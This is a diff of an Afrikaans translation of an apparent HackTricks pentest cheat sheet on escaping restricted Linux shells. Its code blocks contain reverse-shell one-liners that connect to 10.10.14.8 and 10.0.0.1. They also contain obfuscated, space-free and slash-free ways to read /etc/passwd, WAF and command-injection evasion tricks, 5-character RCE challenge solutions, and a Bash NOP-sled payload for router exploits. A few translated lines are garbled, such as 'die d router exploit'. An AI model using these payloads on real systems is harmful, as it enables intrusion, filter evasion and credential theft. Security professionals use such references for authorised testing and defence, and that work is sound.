@@ -1,8 +1,10 @@
 # Bypass Linux-beperkings
 
-## Algemene beperkings-bypasses
+{{#include ../../../banners/hacktricks-training.md}}
 
-Die command-injection- en WAF-evasion-versamelings in PayloadsAllTheThings, Bo0oM se cheat sheet en die twee gekoppelde Secjuice-artikels bied agtergrond vir die shell-syntax-variasies in hierdie afdeling.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+## Omseilings van algemene beperkings
+
+Die command-injection- en WAF-evasion-versamelings in PayloadsAllTheThings, Bo0oM se cheat sheet, en die twee gekoppelde Secjuice-artikels verskaf agtergrond vir die variasies in shell-sintaksis in hierdie afdeling.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
@@ -18,7 +20,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Omseilingspaaie en verbode woorde
+### Bypass Paths en verbode woorde
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -78,7 +80,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Omseil verbode spasies
+### Om verbode spasies te omseil
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -105,16 +107,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Omseil backslash en slash
+### Bypass backslash en slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass pipes
+### Omseil pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Omseiling met heksadesimale enkodering
+### Omseiling met hex-enkodering
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -133,19 +135,19 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Kry karakters uit omgewingsveranderlikes
+### Kry karakters uit Env Variables
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
 ### DNS data exfiltration
 
-Vir out-of-band callbacks kan 'n collaborator-style service soos Burp Collaborator 'n teikentoepassing laat interaksie hê met 'n eksterne bediener; die bestaande [**pingb**](http://pingb.in)-skakel word as historiese navigasie behou, nie as 'n huidige beskikbaarheidsaanspraak nie.<sup>[[6]](#references)</sup>
+Vir out-of-band callbacks kan ’n collaborator-style diens soos Burp Collaborator ’n teikentoepassing induseer om met ’n eksterne bediener te interaksieer; die bestaande [**pingb**](http://pingb.in)-skakel word as historiese navigasie behou, nie as ’n huidige beskikbaarheidsaanspraak nie.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-In 'n beperkte shell is die beskikbare builtins die oorblywende command surface vir hierdie voorbeelde; Bash dokumenteer sy builtin commands en execution grammar.<sup>[[7]](#references)</sup> Idee van [**devploit**](https://twitter.com/devploit).\
-Begin met die bestaande [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)-navigasie, en probeer dan die volgende Bash-specific techniques:<sup>[[7]](#references)</sup>
+In ’n beperkte shell is die beskikbare builtins die oorblywende command surface vir hierdie voorbeelde; Bash dokumenteer sy builtin-opdragte en uitvoeringsgrammatika.<sup>[[7]](#references)</sup> Idee van [**devploit**](https://twitter.com/devploit).\
+Begin met die bestaande [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)-navigasie, en probeer dan die volgende Bash-spesifieke tegnieke:<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -209,14 +211,14 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 ```
 ### Bashfuscator
 
-Die volgende aanroep gebruik Bashfuscator, ’n oopbron-Bash-obfuskasieraamwerk; die skakel na die repository in die kodekommentaar word as navigasie behou.<sup>[[8]](#references)</sup>
+Die volgende aanroep gebruik Bashfuscator, ’n oopbron-Bash-obfuskasie-raamwerk; die repository-skakel in die kodekommentaar word vir navigasie behou.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### RCE met 5 karakters
 
-Die volgende twee historiese 5-karakter-voorbeelde word as reproduksies van challenges behou: die primêre challenge-repository is beskikbaar by [Orange Tsai’s repository](https://github.com/orangetw/My-CTF-Web-Challenges), terwyl die tweede write-up-skakel in die kodeblok navigasie is waarvan die huidige beskikbaarheid nie geverifieer is nie.<sup>[[9]](#references)</sup>
+Die volgende twee historiese 5-karakter-voorbeelde word as uitdaging-reproduksies behou: die primêre uitdaging-repository is beskikbaar by [Orange Tsai se repository](https://github.com/orangetw/My-CTF-Web-Challenges), terwyl die tweede write-up-skakel in die code block navigasie is waarvan die huidige beskikbaarheid nie geverifieer is nie.<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -300,50 +302,50 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-As jy binne ’n filesystem met **read-only- en noexec-beskerming** is, of in ’n **distroless image**, plaas die omgewing execution-beperkings wat deur Linux `mount(8)` en die Distroless-projek gedokumenteer word; die gekoppelde bladsy versamel tegnieke om binne hierdie beperkings te werk.<sup>[[11]](#references)[[12]](#references)</sup>
+As jy binne ’n lêerstelsel met **read-only- en noexec-beskerming** is, of in ’n **distroless image**, plaas die omgewing uitvoeringsbeperkings wat deur Linux `mount(8)` en die Distroless-projek gedokumenteer word; die gekoppelde bladsy versamel tegnieke om binne hierdie beperkings te werk.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & ander Jails Bypass
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
-## Spasie-gebaseerde Bash NOP Sled ("Bashsledding")
+## Space-Based Bash NOP Sled ("Bashsledding")
 
-Wanneer ’n vulnerability jou gedeeltelike beheer gee oor ’n argument wat uiteindelik `system()` of ’n ander shell bereik, kan die payload-offset onseker wees. Alan Cao en Will Tan beskryf ’n beperkte geval op ’n embedded device waar ’n shell-payload in memory-mapped NVRAM versprei en met spasies voorafgegaan is.<sup>[[5]](#references)</sup>
+Wanneer ’n kwesbaarheid jou gedeeltelike beheer gee oor ’n argument wat uiteindelik `system()` of ’n ander shell bereik, kan die payload se offset onseker wees. Alan Cao en Will Tan beskryf ’n beperkte geval op ’n ingebedde toestel waar ’n shell-payload in geheue-gekarteerde NVRAM gesproei en met spasies voorafgegaan is.<sup>[[5]](#references)</sup>
 
-Daarom kan jy ’n *NOP sled for Bash* skep deur jou werklike command met ’n lang reeks spasies of tab-karakters vooraf te gaan; Bash definieer spasies en tabs as blanks wat woorde in ’n simple command skei.<sup>[[5]](#references)[[7]](#references)</sup>
+Daarom kan jy ’n *NOP sled for Bash* skep deur jou werklike command met ’n lang reeks spasies of tab-karakters vooraf te gaan; Bash definieer spasies en tabs as blanks wat woorde in ’n eenvoudige command skei.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-As ’n ROP chain (of ’n ander memory-corruption primitive) ’n wyser na ’n command-string deurgee wat enige plek binne die spasieblok begin, kan Bash die oorblywende voorste spasies ontleed totdat dit die command bereik; in die aangehaalde router-exploit het dit onseker string-offsets bruikbaar gemaak.<sup>[[5]](#references)[[7]](#references)</sup>
+As ’n ROP chain (of ’n ander memory-corruption primitive) ’n command-string pointer deurgee wat enige plek binne die spasieblok begin, kan Bash die oorblywende voorste spasies ontleed totdat dit die command bereik; in die d router exploit het dit onsekere string-offsets bruikbaar gemaak.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Praktiese gebruiksgevalle in beperkte embedded-teikens sluit in:<sup>[[5]](#references)</sup>
+Praktiese gebruiksgevalle in beperkte embedded targets sluit in:<sup>[[5]](#references)</sup>
 
 1. **Memory-mapped configuration blobs** (bv. NVRAM) wat oor prosesse heen toeganklik is.<sup>[[5]](#references)</sup>
-2. Payload-kanale waar die aanvaller nie NULL-bytes kan skryf om die payload te belyn nie (’n algemene aanpassing van die alignment-probleem).<sup>[[5]](#references)</sup>
-3. Embedded-toestelle met ’n klein BusyBox `ash`/`sh`-omgewing, wat BusyBox as applets in hulpbronbeperkte stelsels dokumenteer.<sup>[[10]](#references)</sup>
+2. Payload-kanale waar die attacker nie NULL-bytes kan skryf om die payload te belyn nie (’n algemene aanpassing van die alignment-probleem).<sup>[[5]](#references)</sup>
+3. Embedded devices met ’n klein BusyBox `ash`/`sh`-omgewing, wat BusyBox as applets in resource-constrained systems dokumenteer.<sup>[[10]](#references)</sup>
 
-> 🛠️  Kombineer hierdie tegniek met ROP gadgets wat `system()` in ’n beheerde lab aanroep; die aangehaalde router-navorsing demonstreer hierdie kombinasie op beperkte hardware.<sup>[[5]](#references)</sup>
+> 🛠️  Kombineer hierdie tegniek met ROP gadgets wat `system()` in ’n beheerde lab aanroep; die d router-navorsing demonstreer hierdie kombinasie op beperkte hardware.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Web Application Firewall (WAF)-ontwykingstegnieke #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Web Application Firewall (WAF)-ontwykingstegnieke #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao en Will Tan — Ontginning van zero days in verlate hardware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao and Will Tan — Benutting van zero days in verlate hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — Linux-manualblad](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — Linux-manualblad](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
